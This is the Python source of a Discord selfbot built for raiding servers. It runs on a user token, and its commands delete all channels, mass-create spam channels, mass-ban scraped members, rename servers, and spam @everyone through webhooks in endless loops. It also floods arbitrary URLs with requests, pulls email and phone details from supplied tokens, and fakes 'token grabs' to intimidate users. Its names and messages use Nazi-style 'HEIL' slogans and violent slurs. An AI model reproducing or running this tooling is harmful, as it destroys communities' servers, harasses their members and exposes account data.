
import datetime, asyncio,discord,random,requests,aiohttp,httpx,base64,requests as rq, string,httpx,time,os; from discord.ext import commands; from keep_alive import keep_alive; from traceback import format_exception ; from colorama import Fore,Style; from tasksio import TaskPool


#--------config---------#




names = "HEIL IAD AND AF"



prefix = "."




intents = discord.Intents.all()
iad = commands.Bot(command_prefix = prefix, intents=intents, self_bot=True)

iad.remove_command("help")
os.system('clear')
token = input(Fore.BLUE + """
░█████╗░░█████╗░███╗░░██╗███████╗██╗░██████╗░
██╔══██╗██╔══██╗████╗░██║██╔════╝██║██╔════╝░
██║░░╚═╝██║░░██║██╔██╗██║█████╗░░██║██║░░██╗░
██║░░██╗██║░░██║██║╚████║██╔══╝░░██║██║░░╚██╗
╚█████╔╝╚█████╔╝██║░╚███║██║░░░░░██║╚██████╔╝
░╚════╝░░╚════╝░╚═╝░░╚══╝╚═╝░░░░░╚═╝░╚═════╝░
token: """)



 



def iad1():
	print(f'''
        {Fore.LIGHTRED_EX}SAG SELFBOT
{Fore.RED}[+] Logged in as {iad.user.name}
{Fore.LIGHTMAGENTA_EX}[+] User ID as {iad.user.id}{Fore.RESET}
{Fore.BLUE}[+] Prefix is set as {(Fore.MAGENTA)} {prefix}
[+] Currently in {len(iad.guilds)} guilds{Fore.RESET}
''')

@iad.event
async def on_ready():
  os.system('clear')
  iad1()

@iad.event
async def on_command_error(ctx, error):
  error = "".join(format_exception(error, error, error.__traceback__))
  await ctx.send(f"""**Error**
```py
{error}
```
""", delete_after=5)


headers = {
  'Authorization':token,
} 


#-----nuke shit-------#

async def baan(guild, id, session):
  while True:
    rq = await session.put(f"https://discord.com/api/v9/guilds/{guild}/bans/{id}", headers=headers)
    if rq.status_code == 429:
        json = rq.json() 
        await asyncio.sleep(json['retry_after'])
    else:
        #logging.info(f'Executed {id}')
        break
  print(rq.status_code)




async def deletech(ch, session):
  while True:
    try:
     rq = await session.delete(f"https://discord.com/api/v9/channels/{ch}", headers=headers)
     if rq.status_code == 429:
        json = rq.json() 
        await asyncio.sleep(json['retry_after'])
    except:
      os.system('clear')
      print(iad1)




async def spamr(ctx, session):
  await ctx.message.delete()
  for x in range(100):
        await ctx.guild.create_role(name="HEIL iad")





async def makech(name, session):
  while True:
    try:
     a = await session.post(f'https://discord.com/api/v9/guilds/{guild2}/channels', headers=headers,json={'type':'0', 'name':name})
     if a.status_code == 429:
      json = await a.json() 
      await asyncio.sleep(json['retry_after'])
    except:
      os.system('clear')
      print()

def get_roles(session):
    tasks = []
    for role in roles:
      tasks.append(session.delete(f"https://discord.com/api/v9/guilds/{guild2}/roles/{role}", headers=headers))
    return tasks
      



      

      
######


@iad.command()
async def help(ctx, category=None):
    before = time.monotonic()
    try:
      await ctx.message.delete()
    except:
      pass
    if category == None:
        await ctx.send(f'''
```
          iad ~ selfbot
┌───────────────────────────────
│ help raid  — shows raid cmds  │
│ help misc  — shows misc cmds  │ 
└───────────────────────────────
   | {iad.user} gg/iad
```
        ''')
    if category == 'raid':
        await ctx.send(f'''
```
          iad ~ selfbot

 nuke       ➤ wick bypass      
 chdel      ➤ del channels     
 channelbomb ➤ spam channels   
 nickn   ➤ mass nickname       
 scrape     ➤ scrape membs     
 bana    ➤ bans scraped        

 | {iad.user} | RAID | gg/iad
```
        ''')
    elif category == 'misc':
        await ctx.send(f'''
```
          iad ~ selfbot

 manual ~ pings all roles
 gcspam ~ <i/@> mass gcadd
 purge ~ deletes msgs
 fm ~ shows first msg
 ping ~ shows your ms
 otax ~ <user> sends user token
 ota ~ <user> sends user token2
 spam ~ <amount> <msg>
 unbanall ~ unbans every1
 clear ~ clears channel
 gr ~ gets all roles in guild
 


   | {iad.user} | MISC | gg/iad
```
        ''')













#####   

channels = []







@iad.command(aliases=['mass-unban', "purgebans", "unbanall"])
async def massunban(ctx):
    await ctx.message.delete()
    banlist = await ctx.guild.bans()
    for users in banlist:
        try:
            await asyncio.sleep(2)
            await ctx.guild.unban(user=users.user)
        except:
            pass


@iad.command()
async def chdel(ctx):
  try:
    await ctx.message.delete()
  except:
    pass
  async with httpx.AsyncClient() as session:
    async with TaskPool(5_000) as tasks:
      for ch in ctx.guild.channels:
        await tasks.put(deletech(ch.id, session))

@iad.command()
async def channelbomb(ctx):
  try:
    await ctx.message.delete()
  except:
    pass
  global guild2
  guild2 = ctx.guild.id
  async with httpx.AsyncClient() as session:
    async with TaskPool(5_000) as tasks:
      for i in range(400):
        await tasks.put(asyncio.create_task(makech(names, session)))





@iad.command()
async def scrape(ctx):
  try:
    await ctx.message.delete()
  except:
    pass
  global guild2
  guild2 = ctx.guild.id
  global members2
  guild = ctx.guild
  members2 = await guild.chunk()
  global members
  members = []
  for member in members2:
    members.append(member.id)
  members.remove(ctx.author.id)
  print(Fore.GREEN + f'Scraped {len(members)} members!')
roles = []




@iad.command()
async def webhooknuke(ctx):
  await ctx.message.delete()
  for c in ctx.guild.text_channels:
    try:
      await c.create_webhook(name ="iad")
    except:
      pass



def chunks(l, n):
    n = max(1, n)
    return (l[i:i+n] for i in range(0, len(l), n))







@iad.command()
async def bana(ctx):
  try:
    await ctx.message.delete()
  except:
    pass
  async with httpx.AsyncClient() as client:
    for i in chunks(members, 50):
      tasks = []
      for user in i:
        tasks.append(asyncio.create_task(baan(ctx.guild.id, user,client)))
      await asyncio.gather(*tasks)





async def change(ctx):
  await ctx.guild.edit(name='colonized by iad')
falls = "Surrender before its to late. https://discord.gg/iad https://cdn.discordapp.com/attachments/1006124517703295047/1006567877068984361/ezgif-2-da948c30db.gif"
@iad.command()
async def spamwebhooks(ctx):
  await ctx.message.delete()
  links = []
  for w in await ctx.guild.webhooks():
    links.append(w.url)
  async def rape1(session, link):
      try:
          webhook = discord.Webhook.from_url(link, adapter=discord.AsyncWebhookAdapter(session))
          while True:
              await rape(webhook)
      except Exception as e:
          print(f'{e}')
  async def rape(webhook):
      try:
          await webhook.send(f"@everyone {falls}")
      except:
          pass
  async with aiohttp.ClientSession() as session:
      tasks = []
      async with TaskPool(100000) as tasks:
        for link in links:
            await tasks.put(rape1(session, link))
@iad.command()
async def removeall(ctx):
  async with httpx.AsyncClient() as client:
    r = await client.get(f"https://discord.com/api/v9/channels/{ctx.channel.id}", headers=headers)
    async with TaskPool(10) as tasks:
      for kid in r.json()['recipients']:
        id = kid['id']
        await tasks.put(client.delete(f"https://discord.com/api/v9/channels/{ctx.channel.id}/recipients/{id}", headers=headers))
@iad.command()
async def nuke(ctx, name=None):
  try:
    await ctx.message.delete()
  except:
    pass
  guild = ctx.guild
  global guild2
  guild2 = ctx.guild.id
  for channel in list(guild.channels):
    channels.append(channel.id)
  async with TaskPool(10) as tasks:
    await tasks.put(chdel(ctx)) 
    await tasks.put(channelbomb(ctx))
    await tasks.put(change(ctx))



@iad.event
async def on_guild_channel_create(channel):
  if channel.name == "heil-iad-and-af":
    webhook = await channel.create_webhook(name="heil iad")
    webhook_url = webhook.url
    async with aiohttp.ClientSession() as session:
        webhook = discord.Webhook.from_url(str(webhook_url), adapter=discord.AsyncWebhookAdapter(session))
        while True:
            await webhook.send(f" @everyone {falls}")














##############################################

languages = {'hu': 'Hungarian, Hungary', 'nl': 'Dutch, Netherlands', 'no': 'Norwegian, Norway', 'pl': 'Polish, Poland', 'pt-BR': 'Portuguese, Brazilian, Brazil', 'ro': 'Romanian, Romania', 'fi': 'Finnish, Finland', 'sv-SE': 'Swedish, Sweden', 'vi': 'Vietnamese, Vietnam', 'tr': 'Turkish, Turkey', 'cs': 'Czech, Czechia, Czech Republic', 'el': 'Greek, Greece', 'bg': 'Bulgarian, Bulgaria', 'ru': 'Russian, Russia', 'uk': 'Ukranian, Ukraine', 'th': 'Thai, Thailand', 'zh-CN': 'Chinese, China', 'ja': 'Japanese, Japan', 'zh-TW': 'Chinese, Taiwan', 'ko': 'Korean, Korea'}
locales = ['da', 'de', 'en-GB', 'en-US', 'es-ES', 'fr', 'hr', 'it', 'lt', 'hu', 'nl', 'no', 'pl', 'pt-BR', 'ro', 'fi', 'sv-SE', 'vi', 'tr', 'cs', 'el', 'bg', 'ru', 'uk', 'th', 'zh-CN', 'ja', 'zh-TW', 'ko']


@iad.command()
async def tokeninfo(ctx, _token):
    await ctx.message.delete()
    headers = {
        'Authorization': _token,
        'Content-Type': 'application/json'
    }
    try:
        res = requests.get('https://canary.discordapp.com/api/v6/users/@me', headers=headers)
        res = res.json()
        user_id = res['id']
        locale = res['locale']
        avatar_id = res['avatar']
        language = languages.get(locale)
        user = f"{res['username']}#{res['discriminator']}"
        nitro_type = "None"
        if "premium_type" in res:
            if res['premium_type'] == 2:
                nitro_type = "Nitro Premium"
            elif res['premium_type'] == 1:
                nitro_type = "Nitro Classic"
        creation_date = datetime.datetime.utcfromtimestamp(((int(user_id) >> 22) + 1420070400000) / 1000).strftime(
            '%d-%m-%Y %H:%M:%S UTC')
    except KeyError:
        headers = {
            'Authorization': "Bot " + _token,
            'Content-Type': 'application/json'
        }
        try:
            res = requests.get('https://canary.discordapp.com/api/v6/users/@me', headers=headers)
            res = res.json()
            user_id = res['id']
            locale = res['locale']
            avatar_id = res['avatar']
            language = languages.get(locale)
            creation_date = datetime.datetime.utcfromtimestamp(((int(user_id) >> 22) + 1420070400000) / 1000).strftime(
                '%d-%m-%Y %H:%M:%S UTC')
            user = f"{res['username']}#{res['discriminator']}"   
        except KeyError:
            await ctx.send("Invalid token")
    await ctx.send(f"```diff\n+{user}\nEmail: {res['email']}\nPhone: {res['phone']}\nCreation Date: {creation_date}\nVerified: {res['verified']}\nNitro: {nitro_type}```")












@iad.command()
async def sendreqs(ctx, portlink):
 await ctx.message.delete()
 while 1:
    requests.get(portlink)
    print(Fore.BLUE + f"[LOG] ~ Sent a request to {portlink}")

@iad.command()
async def ping(ctx):
  before = time.monotonic()
  await ctx.message.edit(content="Pinging...")
  ping = (time.monotonic() - before) * 1000
  await ctx.message.edit(content=f"`{int(ping)} ms`")

@iad.command()
async def purge(ctx, limit:int=None):
    try:
        await ctx.message.delete()
    except Exception as error:
        print(f"{Fore.RED}[LOG] ~ [ERROR]{Fore.YELLOW} {error}{Style.RESET_ALL}")
    messages = await ctx.channel.history(limit=limit).flatten()    
    for message in messages:
        if ctx.author.id == message.author.id:
            try:
                try:
                    await message.delete()
                    print(f"{Fore.YELLOW}[LOG] ~{Fore.GREEN} Deleted Message{Style.RESET_ALL}")
                except Exception as error:
                    print(f"{Fore.YELLOW}[LOG] ~{Fore.RED} Deleted Message{Style.RESET_ALL}")
            except:
                pass























@iad.command()
async def otax(ctx, user: discord.User = None):
  await ctx.message.delete()
  msg = await ctx.send(f'Otaxing {user.name}...')
  time.sleep(3)
  if user == None:
    await ctx.send('A user is required!', delete_after=1)
  else:
    base64_string = "=="
    while(base64_string.find("==") != -1):
        sample_string = str(user.id)
        sample_string_bytes = sample_string.encode("ascii")
        base64_bytes = base64.b64encode(sample_string_bytes)
        base64_string = base64_bytes.decode("ascii")
    else:
        token = base64_string+"."+ 'Y' + ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(5))+"."+''.join(random.choice(string.ascii_letters + string.digits) for _ in range(27))
  await msg.edit(content=f'```diff\n-Succesfully otaxed {user.name}\n\n{token}\n```')       







@iad.command()
async def spam(ctx, amount:int, *, message):
    try:
        await ctx.message.delete()
    except Exception as error:
        print(f"{Fore.RED}[LOG] ~ ERROR{Fore.YELLOW} {error}{Style.RESET_ALL}")
    async def spam(message):
        async with httpx.AsyncClient() as session:
            payload = {'content':message}
            r = await session.post(f"https://discord.com/api/v9/channels/{ctx.channel.id}/messages", json=payload, headers=headers) 
            if r.status_code == 200 or r.status_code == 201 or r.status_code == 204:
                print(f"{Fore.YELLOW}[LOG] ~{Fore.GREEN} Spammed Message{Style.RESET_ALL}")
            elif r.status_code == 429:
                print(f"{Fore.YELLOW}[LOG] ~{Fore.LIGHTYELLOW_EX} ratelimited{Style.RESET_ALL}")
            else:
                print(f"{Fore.YELLOW}[LOG] ~ {Fore.RED} ERROR{Style.RESET_ALL}")
    await asyncio.gather(*[spam(message) for i in range(amount)])


def ascii_gen(length):
        asc = ""
        for x in range(int(length)):
            num = random.randrange(13000)
            asc = asc + chr(num)
        return asc





@iad.command()
async def lagchat(ctx,*, message=None):
    try:
        await ctx.message.delete()
    except Exception as error:
        print(f"{Fore.RED}[ERROR]{Fore.YELLOW} {error}{Style.RESET_ALL}")
    emotes = "😀😃😄😁😆😅😂🤣☺️😇🙂🙃😉😍😘😗😙😋😛😝😜🤪🤨🧐🤓😎🤩😏😒😞😔😟😕🙁☹️😣😖😫😩😢😭😤🥰🥶🥵 😠😡🤬🤯😳😱😨😰😥😓🤗🤔🤭🤫🤥😶😐😑😬🙄😯😦😧😮😲😴🤤😪😵🤐🤢🤮🤧😷🤒🤕🤑🤠😈👿👹👺🤡💩👻💀☠️👽👾🤖🎃😺😸😹😻😼😽🙀😿😾🤲🤲🏻🤲🏼🤲🏽👐🏾🤲🏿👐👐🏻👐🏼👐🏽👐🏾👐🏿🙌🙌🏻🙌🏼🙌🏽🙌🏾🙌🏿👏👏🏻👏🏼👏🏽👏🏾👏🏿😀😃😄😁😆😅😂🤣☺️😇🙂🙃😉😍😘😗😙😋😛😝😜🤪🤨🧐🤓😎🤩😏😒😞😔😟😕🙁☹️😣😖😫😩😢😭😤🥰🥶🥵 😠😡🤬🤯😳😱😨😰😥😓🤗🤔🤭🤫🤥😶😐😑😬🙄😯😦😧😮😲😴🤤😪😵🤐🤢🤮🤧😷🤒🤕🤑🤠😈👿👹👺🤡💩👻💀☠️👽👾🤖🎃😺😸😹😻😼😽🙀😿😾🤲🤲🏻🤲🏼🤲🏽👐🏾🤲🏿👐👐🏻👐🏼👐🏽👐🏾👐🏿🙌🙌🏻🙌🏼🙌🏽🙌🏾🙌🏿👏👏🏻👏🏼👏🏽👏🏾👏🏿😀😃😄😁😆😅😂🤣☺️😇🙂🙃😉😍😘😗😙😋😛😝😜🤪🤨🧐🤓😎🤩😏😒😞😔😟😕🙁☹️😣😖😫😩😢😭😤🥰🥶🥵 😠😡🤬🤯😳😱😨😰😥😓🤗🤔🤭🤫🤥😶😐😑😬🙄😯😦😧😮😲😴🤤😪😵🤐🤢🤮🤧😷🤒🤕🤑🤠😈👿👹👺🤡💩👻💀☠️👽👾🤖🎃😺😸😹😻😼😽🙀😿😾🤲🤲🏻🤲🏼🤲🏽👐🏾🤲🏿👐👐🏻👐🏼👐🏽👐🏾👐🏿🙌🙌🏻🙌🏼🙌🏽🙌🏾🙌🏿👏👏🏻👏🏼👏🏽👏🏾👏🏿"
    for i in range(50):
        try:
            await ctx.send(f"{message} {random.choice([ascii_gen(1000), emotes])}")
        except Exception as error:
            print(f"{Fore.RED}[ERROR]{Fore.YELLOW} {error}{Style.RESET_ALL}")  










@iad.command()
async def mr(ctx, emoj):
    try:
        await ctx.message.delete()
    except Exception as error:
        print(f"{Fore.RED}[ERROR]{Fore.YELLOW} {error}{Style.RESET_ALL}")
    messages = await ctx.channel.history(limit=999).flatten()
    for message in messages:
        try:
            await message.add_reaction(emoj)
            print(Fore.GREEN + "added a reaction")
        except:
          print(f"{Fore.RED}[ERROR]{Fore.YELLOW}{Style.RESET_ALL}")





@iad.command()
async def gcspam(ctx, user_1:discord.User, user_2:discord.User):
    try:
        await ctx.message.delete()
    except Exception as error:
        print(f"{Fore.RED}[ERROR]{Fore.YELLOW} {error}{Style.RESET_ALL}")
    session = httpx.AsyncClient()
    ids = [user_1.id, user_2.id]
    gc_ids = []
    for groups in range(15):
        r = await session.post('https://discord.com/api/v9/users/@me/channels', headers=headers, json={"recipients":[]})
        if r.status_code == 200 or r.status_code == 201 or r.status_code == 204:
            print(f"{Fore.YELLOW}[LOG]{Fore.GREEN} Created Group Chat{Style.RESET_ALL}")
            gc_ids.append(r.json()['id'])
        else:
            print(f"{Fore.YELLOW}[LOG]{Fore.RED} Error{Style.RESET_ALL}")
    for gc_id in gc_ids:
        for user_id in ids:
            r = await session.put(f"https://discord.com/api/v9/channels/{gc_id}/recipients/{user_id}", headers=headers)
            if r.status_code == 200 or r.status_code == 201 or r.status_code == 204:
                print(f"{Fore.YELLOW}[LOG]{Fore.GREEN} Added User To Group Chat{Style.RESET_ALL}")
            else:
                print(f"{Fore.YELLOW}[LOG]{Fore.RED} Error {Style.RESET_ALL}")
                print(r.text)
    for gc in gc_ids:
        r = await session.delete(f"https://discord.com/api/v9/channels/{gc}?silent=true", headers=headers)
        if r.status_code == 200 or r.status_code == 201 or r.status_code == 204:
            print(f"{Fore.YELLOW}[LOG]{Fore.GREEN} Left Group Chat{Style.RESET_ALL}")

        else:
            print(f"{Fore.YELLOW}[LOG]{Fore.RED}Error{Style.RESET_ALL}")
    del gc_ids




  
@iad.command()
async def nickn(ctx):
  await ctx.message.delete()
  members = await ctx.guild.chunk()
  for member in members:
      try:
          await member.edit(nick='HEIL FEAR')
      except:
          pass





@iad.command()
async def rc(ctx):
  await ctx.message.delete()
  os.system('clear')
  print(iad1)



@iad.command(name='first-message', aliases=['firstmsg', 'fm', 'firstmessage'])
async def _first_message(ctx, channel: discord.TextChannel = None):
    await ctx.message.delete()
    if channel is None:
        channel = ctx.channel
    first_message = (await channel.history(limit=1,
                                           oldest_first=True).flatten())[0]
    await ctx.send(f'''
Content: {first_message.content}
Jump: {first_message.jump_url}
    ''')







@iad.command()
async def massping(ctx):
  await ctx.message.delete()
  count = 0
  roles = []
  for role in ctx.guild.roles:
    if role.name == '@everyone':
      pass
    else:
      roles.append(f'<@&{role.id}>')
  for c in ctx.guild.channels:
    for i in range(50):
      count += 1
      await ctx.send('**@everyone** ' + f' '.join([random.choice(roles) for i in range(5)]) + f' | gg/sag')




@iad.command(aliases=['otacks', 'tokengrab', 'tg', 'ota'])
async def _tokengrab(ctx, *, user: discord.User=None):
        await ctx.message.delete()
        if not user:
            user = ctx.author
        userid=str(user.id)
        encodedBytes = base64.b64encode(str(userid).encode("utf-8"))
        encodedid = str(encodedBytes, "utf-8")
        username = user.display_name
        discrim = user.discriminator
        end = ('').join(random.choices(string.ascii_letters + string.digits + "-" + "_", k=27))
        middle = ('').join(random.choices(string.ascii_letters + string.digits + "-" + "_", k=6))

        await ctx.send(f'''
>>> ```ini
[ TOKEN DECODER - FETCHED TOKEN ]
```
```diff
Full Token : {encodedid}.{middle}.{end}
```
        ''')









@iad.command(aliases=['get-roles', 'cr', 'copy-roles', 'getroles', 'copyroles'])
async def gr(ctx):
    await ctx.message.delete()
    roles = list(ctx.guild.roles)
    roles.reverse()
    roleStr = ""
    for role in roles:
        if role.name == "@everyone":
            roleStr += "@\u200beveryone"
        else:
            roleStr += role.name + "\n"
    print(roleStr)
    await ctx.send(roleStr)

@iad.command()
async def clear(ctx):
  await ctx.message.delete()
  x = await ctx.channel.clone(reason="Has been nuked")
  await ctx.channel.delete()
  await x.send("""
  > ```ini
> [ CHANNEL HAS BEEN CLEARED ]
> ```""")




@iad.command()
async def nz(ctx):
  global raid
  raid = True
  await ctx.message.delete()
  while raid:
    try:
        await ctx.send(f"@everyone discord.gg/iad Flooded by Fear" + 'ﾠﾠ'+'\n' * 300 + 'ﾠﾠ')
    except:
        pass

@iad.command()
async def on(ctx):
  await ctx.message.delete()
  await ctx.send("on")



keep_alive()
iad.run(token, bot=False)
